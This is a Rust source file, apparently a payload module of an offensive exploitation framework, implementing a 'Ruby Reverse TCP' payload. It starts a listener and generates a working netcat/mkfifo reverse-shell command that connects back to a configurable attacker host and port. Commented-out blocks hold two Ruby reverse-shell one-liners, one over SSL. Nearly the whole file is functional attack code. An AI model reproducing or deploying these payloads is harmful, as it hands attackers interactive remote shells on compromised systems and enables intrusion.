use crate::core::{
    handler::generic_tcp_handler::GenericTcpHandler,
    opt::Opt,
    payload::{reverse::Reverse, Info, Payload},
};
use log::info;
use std::{error::Error, thread};

pub struct RubyReverseTcp {
    pub reverse: Reverse,
}

impl Payload for RubyReverseTcp {
    fn default() -> Self {
        RubyReverseTcp {
            reverse: Reverse::default(),
        }
    }

    fn pretask(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut handler = GenericTcpHandler::new(&self.reverse.lhost, &self.reverse.lport)?;
        thread::spawn(move || {
            // TODO: how to propogate Result here?
            handler.listen_for_one().unwrap();
        });
        Ok(())
    }

    fn blob(&self) -> Vec<u8> {
        // let blob = format!("ruby -e \"require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"{}\",\"{}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){{|io|c.print io.read}}end\"", self.reverse.lhost, self.reverse.lport);
        /*
            let blob = format!(
                r#"ruby -e 'require "socket";c=TCPSocket.new("{}", {});
        $stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{{|l|l=l.strip;next if l.length==0;
        (IO.popen(l,"rb"){{|fd| fd.each_line {{|o| c.puts(o.strip) }}}}) rescue nil }}'"#,
                self.reverse.lhost, self.reverse.lport
            );
            */
        // TODO: for now just setting blob as nc mkfifo for testing
        let blob = format!(
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f",
            self.reverse.lhost, self.reverse.lport
        );
        blob.into_bytes()
    }

    fn info(&self) -> Info {
        Info {
            descriptive_name: "Ruby Reverse TCP".to_string(),
            module_path: "payload/ruby_reverse_tcp".to_string(),
            kind: self.kind().to_string(),
            description: None,
            license: None,
            author: None,
            references: None,
            platform: None,
        }
    }

    fn opts(&self) -> Vec<Opt> {
        let mut opts: Vec<Opt> = Vec::new();
        let mut reverse_opts = Reverse::opts();
        opts.append(&mut reverse_opts);
        opts
    }

    fn apply_opts(&mut self, opts: Vec<Opt>) -> Result<(), Box<dyn Error>> {
        for opt in opts {
            match opt.name.as_str() {
                // TODO: Need solution so code below is not duplicated for another module which uses Reverse
                "LHOST" => self.reverse.lhost = opt.value.ok_or("LHOST option is required")?,
                "LPORT" => self.reverse.lport = opt.value.ok_or("LPORT option is required")?,
                _ => info!("Unknown option name {} was provided", opt.name),
            }
        }
        Ok(())
    }
}
